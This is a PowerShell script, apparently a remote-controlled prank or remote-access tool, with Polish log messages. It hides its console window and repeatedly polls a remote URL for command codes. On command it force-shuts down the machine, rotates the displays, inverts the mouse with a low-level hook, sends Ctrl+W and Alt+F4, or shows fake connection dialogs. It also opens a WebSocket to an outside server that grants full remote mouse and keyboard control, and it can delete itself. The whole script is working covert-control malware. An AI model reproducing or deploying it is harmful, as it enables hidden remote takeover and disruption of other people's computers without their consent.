$checkInterval = 3
$youtubeUrl = "https://www.youtube.com/watch?v=DjDSUqTcrv4"
$watchTime = 45
$url = "https://wkrgames.com/guslarz/pr/start.txt"
$scriptPath = $MyInvocation.MyCommand.Path
$youtubeStarted = $false
$ctrlWStarted = $false
$altF4Started = $false
$mouseJobStarted = $false
$msg12Shown = $false
$msg13Shown = $false
$wsJob = $null

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ConsoleHelper {
    [DllImport("kernel32.dll")] public static extern bool AllocConsole();
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@ -ErrorAction SilentlyContinue
[ConsoleHelper]::AllocConsole() | Out-Null
[ConsoleHelper]::ShowWindow([ConsoleHelper]::GetConsoleWindow(), 0) | Out-Null

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class R2 {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
    public struct D {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
        public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra;
        public int dmFields, dmPositionX, dmPositionY, dmDisplayOrientation, dmDisplayFixedOutput;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
        public short dmLogPixels;
        public int dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency;
    }
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
    public struct DD {
        public int cb;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string DeviceName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceString;
        public int StateFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceID;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=128)] public string DeviceKey;
    }
    [DllImport("user32.dll")] public static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DD lpDisplayDevice, uint dwFlags);
    [DllImport("user32.dll")] public static extern int EnumDisplaySettings(string name, int mode, ref D dev);
    [DllImport("user32.dll")] public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref D lpDevMode, IntPtr hwnd, int dwFlags, IntPtr lParam);
}
"@ -ErrorAction SilentlyContinue

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Display {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct DEVMODE {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
        public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra;
        public uint dmFields;
        public int dmPositionX, dmPositionY;
        public uint dmDisplayOrientation, dmDisplayFixedOutput;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
        public short dmLogPixels;
        public uint dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency;
    }
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwFlags, IntPtr lParam);
}
"@ -ErrorAction SilentlyContinue

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

public class MouseHook {
    private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelMouseProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static volatile bool _active = false;
    private static volatile bool _busy = false;
    private static int _anchorX = -1;
    private static int _anchorY = -1;

    [StructLayout(LayoutKind.Sequential)]
    private struct MSLLHOOKSTRUCT {
        public int x, y;
        public uint mouseData, flags, time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam, lParam;
        public uint time;
        public int ptX, ptY;
    }

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] private static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] private static extern int GetSystemMetrics(int nIndex);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] private static extern uint GetCurrentThreadId();
    [DllImport("user32.dll")] private static extern int GetMessage(out MSG m, IntPtr h, uint min, uint max);
    [DllImport("user32.dll")] private static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] private static extern IntPtr DispatchMessage(ref MSG m);
    [DllImport("user32.dll")] private static extern bool PostThreadMessage(uint id, uint msg, IntPtr w, IntPtr l);

    private static Thread _thread;
    private static uint _tid;

    public static void Start() {
        if (_active) return;
        _active = true;
        _busy = false;
        _anchorX = -1;
        _anchorY = -1;

        _thread = new Thread(() => {
            _tid = GetCurrentThreadId();
            using (var p = Process.GetCurrentProcess())
            using (var m = p.MainModule)
                _hookID = SetWindowsHookEx(14, _proc, GetModuleHandle(m.ModuleName), 0);

            MSG msg;
            while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }
            if (_hookID != IntPtr.Zero) UnhookWindowsHookEx(_hookID);
        });
        _thread.IsBackground = true;
        _thread.Start();
        Thread.Sleep(150);
    }

    public static void Stop() {
        _active = false;
        _anchorX = -1;
        _anchorY = -1;
        if (_tid != 0) PostThreadMessage(_tid, 0x0012, IntPtr.Zero, IntPtr.Zero);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (int)wParam == 0x0200 && _active && !_busy) {
            _busy = true;
            var hs = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));

            if (_anchorX == -1) {
                _anchorX = hs.x;
                _anchorY = hs.y;
                _busy = false;
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            int dx = hs.x - _anchorX;
            int dy = hs.y - _anchorY;

            if (dx != 0 || dy != 0) {
                int screenW = GetSystemMetrics(0);
                int screenH = GetSystemMetrics(1);

                int newX = _anchorX - dx;
                int newY = _anchorY - dy;

                if (newX < 0)           { _anchorX += (-newX); newX = 0; }
                if (newY < 0)           { _anchorY += (-newY); newY = 0; }
                if (newX >= screenW)    { _anchorX -= (newX - screenW + 1); newX = screenW - 1; }
                if (newY >= screenH)    { _anchorY -= (newY - screenH + 1); newY = screenH - 1; }

                SetCursorPos(newX, newY);
                _anchorX = newX;
                _anchorY = newY;

                _busy = false;
                return (IntPtr)1;
            }

            _busy = false;
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@ -ErrorAction SilentlyContinue

function Set-AllRotations($rot) {
    $rotNames = @{0="Normalny (0)"; 1="90 stopni"; 2="180 stopni"; 3="270 stopni"}
    Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Ustawianie obrotu: $($rotNames[$rot])" -ForegroundColor Cyan

    $changeResults = @{
        0  = "SUKCES"
        1  = "SUKCES - wymagany restart"
       -1  = "BLAD - ogolny blad"
       -2  = "BLAD - nieprawidlowy tryb"
       -3  = "BLAD - sterownik nie obsluguje"
       -4  = "BLAD - brak uprawnien (uruchom jako Admin!)"
    }

    Write-Host "  [Metoda 1] EnumDisplayDevices..." -ForegroundColor Gray
    $iDev = 0
    $found = 0
    while ($true) {
        $dd = New-Object R2+DD
        $dd.cb = [Runtime.InteropServices.Marshal]::SizeOf($dd)
        $ok = [R2]::EnumDisplayDevices($null, $iDev, [ref]$dd, 0)
        if (-not $ok) { break }
        Write-Host "    [$iDev] '$($dd.DeviceName)' StateFlags=$($dd.StateFlags)" -ForegroundColor Gray

        if ($dd.StateFlags -band 1) {
            $found++
            $devName = $dd.DeviceName
            $d = New-Object R2+D
            $d.dmSize = [Runtime.InteropServices.Marshal]::SizeOf($d)
            $enumResult = [R2]::EnumDisplaySettings($devName, -1, [ref]$d)
            Write-Host "    EnumDisplaySettings wynik: $enumResult | $($d.dmPelsWidth)x$($d.dmPelsHeight) | Obrot: $($d.dmDisplayOrientation)" -ForegroundColor Gray

            if ($enumResult -ne 0) {
                $d.dmDisplayOrientation = $rot
                $d.dmFields = 0x80
                $result = [R2]::ChangeDisplaySettingsEx($devName, [ref]$d, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                $msg = if ($changeResults.ContainsKey($result)) { $changeResults[$result] } else { "Nieznany kod: $result" }
                $color = if ($result -eq 0 -or $result -eq 1) { "Green" } else { "Red" }
                Write-Host "    Monitor $found ($devName): $msg" -ForegroundColor $color
            }
        }
        $iDev++
    }

    if ($found -eq 0) {
        Write-Host "  [Metoda 1] Brak aktywnych monitorow, próbuje Metoda 2..." -ForegroundColor Yellow

        Write-Host "  [Metoda 2] Display+DEVMODE na null..." -ForegroundColor Gray
        $d = New-Object Display+DEVMODE
        $d.dmSize = [int32][Runtime.InteropServices.Marshal]::SizeOf($d)
        $ok = [Display]::EnumDisplaySettings($null, -1, [ref]$d)
        Write-Host "    EnumDisplaySettings(null): $ok | $($d.dmPelsWidth)x$($d.dmPelsHeight) | Obrot: $($d.dmDisplayOrientation)" -ForegroundColor Yellow

        if ($ok) {
            $d.dmDisplayOrientation = [uint32]$rot
            $d.dmFields = [uint32]0x80
            $result = [Display]::ChangeDisplaySettingsEx($null, [ref]$d, [IntPtr]::Zero, 0, [IntPtr]::Zero)
            $msg = if ($changeResults.ContainsKey([int]$result)) { $changeResults[[int]$result] } else { "Nieznany kod: $result" }
            $color = if ($result -eq 0 -or $result -eq 1) { "Green" } else { "Red" }
            Write-Host "    Wynik: $msg" -ForegroundColor $color
        } else {
            Write-Host "    BLAD: EnumDisplaySettings(null) tez nie dziala!" -ForegroundColor Red
        }

        Write-Host "  [Metoda 3] Proba przez \\.\DISPLAY1..." -ForegroundColor Gray
        foreach ($dispName in @("\\.\DISPLAY1","\\.\DISPLAY2","\\.\DISPLAY3")) {
            $d2 = New-Object Display+DEVMODE
            $d2.dmSize = [int32][Runtime.InteropServices.Marshal]::SizeOf($d2)
            $ok2 = [Display]::EnumDisplaySettings($dispName, -1, [ref]$d2)
            if ($ok2) {
                Write-Host "    $dispName`: $($d2.dmPelsWidth)x$($d2.dmPelsHeight) | Obrot: $($d2.dmDisplayOrientation)" -ForegroundColor Green
                $d2.dmDisplayOrientation = [uint32]$rot
                $d2.dmFields = [uint32]0x80
                $result = [Display]::ChangeDisplaySettingsEx($dispName, [ref]$d2, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                $msg = if ($changeResults.ContainsKey([int]$result)) { $changeResults[[int]$result] } else { "Nieznany kod: $result" }
                $color = if ($result -eq 0 -or $result -eq 1) { "Green" } else { "Red" }
                Write-Host "    Wynik: $msg" -ForegroundColor $color
            } else {
                Write-Host "    $dispName`: brak" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Host "  Lacznie monitorow: $found`n" -ForegroundColor Gray
    }
}

function Start-MouseInversion {
    [MouseHook]::Start()
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Hook myszki aktywny (SendInput, bez lagu)" -ForegroundColor Green
}

function Stop-MouseInversion {
    [MouseHook]::Stop()
}

# ============================================================
#  WebSocket Remote Control (wartosci 10/11)
#  Format: x,y,click,keys,scroll
# ============================================================
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Mouse {
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    public const uint MOUSEEVENTF_LEFTDOWN   = 0x0002;
    public const uint MOUSEEVENTF_LEFTUP     = 0x0004;
    public const uint MOUSEEVENTF_RIGHTDOWN  = 0x0008;
    public const uint MOUSEEVENTF_RIGHTUP    = 0x0010;
    public const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    public const uint MOUSEEVENTF_MIDDLEUP   = 0x0040;
    public static void LeftClick()   { mouse_event(MOUSEEVENTF_LEFTDOWN,  0,0,0,0); mouse_event(MOUSEEVENTF_LEFTUP,  0,0,0,0); }
    public static void RightClick()  { mouse_event(MOUSEEVENTF_RIGHTDOWN, 0,0,0,0); mouse_event(MOUSEEVENTF_RIGHTUP, 0,0,0,0); }
    public static void MiddleClick() { mouse_event(MOUSEEVENTF_MIDDLEDOWN,0,0,0,0); mouse_event(MOUSEEVENTF_MIDDLEUP,0,0,0,0); }
}
"@ -ErrorAction SilentlyContinue

Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue

$wsScriptBlock = {
    param($wsUrl)

    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Mouse2 {
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    public const uint MOUSEEVENTF_LEFTDOWN   = 0x0002;
    public const uint MOUSEEVENTF_LEFTUP     = 0x0004;
    public const uint MOUSEEVENTF_RIGHTDOWN  = 0x0008;
    public const uint MOUSEEVENTF_RIGHTUP    = 0x0010;
    public const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    public const uint MOUSEEVENTF_MIDDLEUP   = 0x0040;
    public const uint MOUSEEVENTF_WHEEL      = 0x0800;
    public static void LeftClick()   { mouse_event(MOUSEEVENTF_LEFTDOWN,  0,0,0,0); mouse_event(MOUSEEVENTF_LEFTUP,  0,0,0,0); }
    public static void RightClick()  { mouse_event(MOUSEEVENTF_RIGHTDOWN, 0,0,0,0); mouse_event(MOUSEEVENTF_RIGHTUP, 0,0,0,0); }
    public static void MiddleClick() { mouse_event(MOUSEEVENTF_MIDDLEDOWN,0,0,0,0); mouse_event(MOUSEEVENTF_MIDDLEUP,0,0,0,0); }
    public static void LeftDown()    { mouse_event(MOUSEEVENTF_LEFTDOWN,  0,0,0,0); }
    public static void LeftUp()      { mouse_event(MOUSEEVENTF_LEFTUP,    0,0,0,0); }
    public static void RightDown()   { mouse_event(MOUSEEVENTF_RIGHTDOWN, 0,0,0,0); }
    public static void RightUp()     { mouse_event(MOUSEEVENTF_RIGHTUP,   0,0,0,0); }
    public static void Scroll(int lines) { mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (uint)(lines * 120), 0); }
}
"@ -ErrorAction SilentlyContinue
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue

    # Format: x,y,click,keys,scroll
    function Handle-WsMessage($msg) {
        $parts = $msg -split ','
        if ($parts.Count -lt 5) { return }
        $mx     = [int]$parts[0]
        $my     = [int]$parts[1]
        $click  = $parts[2].Trim()
        $keys   = $parts[3]
        $scroll = [int]$parts[4]

        if ($mx -ne -1 -and $my -ne -1) {
            [Mouse2]::SetCursorPos($mx, $my)
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Mysz -> $mx,$my" -ForegroundColor Cyan
        }
        switch ($click) {
            "lclick"  { [Mouse2]::LeftClick();   Write-Host "[$(Get-Date -Format 'HH:mm:ss')] LClick"   -ForegroundColor Yellow }
            "rclick"  { [Mouse2]::RightClick();  Write-Host "[$(Get-Date -Format 'HH:mm:ss')] RClick"   -ForegroundColor Yellow }
            "mclick"  { [Mouse2]::MiddleClick(); Write-Host "[$(Get-Date -Format 'HH:mm:ss')] MClick"   -ForegroundColor Yellow }
            "ldouble" {
                [Mouse2]::LeftClick(); Start-Sleep -Milliseconds 50; [Mouse2]::LeftClick()
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] DoubleClick" -ForegroundColor Yellow
            }
            "ldown"  { [Mouse2]::LeftDown();  Write-Host "[$(Get-Date -Format 'HH:mm:ss')] LDown" -ForegroundColor Magenta }
            "lup"    { [Mouse2]::LeftUp();    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] LUp"   -ForegroundColor Magenta }
            "rdown"  { [Mouse2]::RightDown(); Write-Host "[$(Get-Date -Format 'HH:mm:ss')] RDown" -ForegroundColor Magenta }
            "rup"    { [Mouse2]::RightUp();   Write-Host "[$(Get-Date -Format 'HH:mm:ss')] RUp"   -ForegroundColor Magenta }
            "lmove"  { }
        }
        if ($keys -ne 'none' -and $keys -ne '') {
            [System.Windows.Forms.SendKeys]::SendWait($keys)
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Keys: '$keys'" -ForegroundColor Green
        }
        if ($scroll -ne 0) {
            [Mouse2]::Scroll($scroll)
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Scroll: $scroll" -ForegroundColor Cyan
        }
    }

    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Laczenie z $wsUrl ..." -ForegroundColor Green
    while ($true) {
        try {
            $ws  = New-Object System.Net.WebSockets.ClientWebSocket
            $cts = New-Object System.Threading.CancellationTokenSource
            $connectTask = $ws.ConnectAsync([Uri]$wsUrl, $cts.Token)
            $connectTask.Wait(10000) | Out-Null
            if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) { throw "Nie mozna polaczyc" }
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Polaczono! Czekam na komendy..." -ForegroundColor Green
            $buffer = New-Object byte[] 4096
            while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
                $seg    = New-Object ArraySegment[byte] (,$buffer)
                $result = $ws.ReceiveAsync($seg, $cts.Token).GetAwaiter().GetResult()
                if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
                    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Serwer zamknal polaczenie" -ForegroundColor Yellow
                    break
                }
                $msg = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Odebrano: '$msg'" -ForegroundColor Gray
                if ($msg -ne "-1,-1,none,none,0") { Handle-WsMessage $msg }
            }
        } catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Blad: $_" -ForegroundColor Red
        } finally {
            try { $ws.Dispose() } catch {}
            try { $cts.Dispose() } catch {}
        }
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Reconnect za 5s..." -ForegroundColor DarkGray
        Start-Sleep 5
    }
}

function Start-WsControl {
    $script:wsJob = Start-Job -ScriptBlock $wsScriptBlock -ArgumentList "wss://ws-control.onrender.com"
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Job uruchomiony (ID: $($script:wsJob.Id))" -ForegroundColor Green
}

function Stop-WsControl {
    if ($script:wsJob) {
        Stop-Job -Job $script:wsJob
        Remove-Job -Job $script:wsJob -Force
        $script:wsJob = $null
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Job zatrzymany" -ForegroundColor Green
    }
}

Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Skrypt uruchomiony. Monitoruje: $url" -ForegroundColor Green

while ($true) {
    try {
        $content = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5
        $value = $content.Content.Trim()
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Odczytano wartosc: '$value'" -ForegroundColor Gray
    } catch {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] BLAD pobierania URL: $_" -ForegroundColor Red
        Start-Sleep $checkInterval
        continue
    }

    if ($value -ne "2")  { $youtubeStarted = $false }
    if ($value -ne "8")  { $ctrlWStarted   = $false }
    if ($value -ne "9")  { $altF4Started   = $false }
    if ($value -ne "12") { $msg12Shown = $false }
    if ($value -ne "13") { $msg13Shown = $false }

    switch ($value) {
        "-1" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [-1] Usuwam skrypt i koncze program" -ForegroundColor Red
            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
            exit
        }
        "1" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [1] Uruchamiam YT, czekam $watchTime s, potem wylaczam PC" -ForegroundColor Yellow
            Start-Process $youtubeUrl
            Start-Sleep 5
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait("f")
            Start-Sleep $watchTime
            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
            Stop-Computer -Force
        }
        "2" {
            if (-not $youtubeStarted) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] Uruchamiam YT" -ForegroundColor Yellow
                Start-Process $youtubeUrl
                Start-Sleep 5
                Add-Type -AssemblyName System.Windows.Forms
                [System.Windows.Forms.SendKeys]::SendWait("f")
                $youtubeStarted = $true
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] YT uruchomiony" -ForegroundColor Green
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] YT juz uruchomiony, pomijam" -ForegroundColor Gray
            }
        }
        "3" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [3] Wylaczam PC" -ForegroundColor Red
            if (Test-Path $scriptPath) { Remove-Item $scriptPath -Force }
            Stop-Computer -Force
        }
        "4" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [4] Obracam ekrany o 180" -ForegroundColor Magenta
            Set-AllRotations 2
        }
        "5" {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [5] Przywracam normalny obrot" -ForegroundColor Magenta
            Set-AllRotations 0
        }
        "6" {
            if (-not $mouseJobStarted) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [6] Odwracam sterowanie myszka" -ForegroundColor Magenta
                Start-MouseInversion
                $mouseJobStarted = $true
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [6] Inwersja myszki juz aktywna, pomijam" -ForegroundColor Gray
            }
        }
        "7" {
            if ($mouseJobStarted) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [7] Przywracam normalne sterowanie myszka" -ForegroundColor Magenta
                Stop-MouseInversion
                $mouseJobStarted = $false
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Myszka przywrocona do normy" -ForegroundColor Green
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [7] Inwersja myszki nie byla aktywna" -ForegroundColor Gray
            }
        }
        "8" {
            if (-not $ctrlWStarted) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [8] Wysylam Ctrl+W" -ForegroundColor Cyan
                Add-Type -AssemblyName System.Windows.Forms
                [System.Windows.Forms.SendKeys]::SendWait("^w")
                $ctrlWStarted = $true
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [8] Ctrl+W juz wyslany, pomijam" -ForegroundColor Gray
            }
        }
        "9" {
            if (-not $altF4Started) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [9] Wysylam Alt+F4" -ForegroundColor Cyan
                Add-Type -AssemblyName System.Windows.Forms
                [System.Windows.Forms.SendKeys]::SendWait("%{F4}")
                $altF4Started = $true
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [9] Alt+F4 juz wyslany, pomijam" -ForegroundColor Gray
            }
        }
        "10" {
            if (-not $wsJob) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [10] Uruchamiam WebSocket remote control" -ForegroundColor Cyan
                Start-WsControl
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [10] WebSocket juz aktywny, pomijam" -ForegroundColor Gray
            }
        }
        "11" {
            if ($wsJob) {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [11] Zatrzymuje WebSocket remote control" -ForegroundColor Cyan
                Stop-WsControl
            } else {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [11] WebSocket nie byl aktywny" -ForegroundColor Gray
            }
        }
        "12" {
             if (-not $msg12Shown) {
                Add-Type -AssemblyName System.Windows.Forms
                [System.Windows.Forms.MessageBox]::Show("Jeffrey Epstein chce sie polaczyc z urzadzeniem.","Polaczenie urzadzenia",[System.Windows.Forms.MessageBoxButtons]::YesNo,[System.Windows.Forms.MessageBoxIcon]::Question)
                $msg12Shown = $true
            }
        }
        "13" {
            if (-not $msg13Shown) {
                Add-Type -AssemblyName System.Windows.Forms
                [System.Windows.Forms.MessageBox]::Show("Benjamin Netanyahu chce sie polaczyc z urzadzeniem.","Polaczenie urzadzenia",[System.Windows.Forms.MessageBoxButtons]::YesNo,[System.Windows.Forms.MessageBoxIcon]::Question)
                $msg13Shown = $true
            }
        }
        
        default {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Nieznana wartosc: '$value', czekam..." -ForegroundColor DarkGray
        }

    }

    # Flush logow z WebSocket joba
    if ($wsJob) {
        Receive-Job -Job $wsJob -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_ }
    }

    Start-Sleep $checkInterval
}
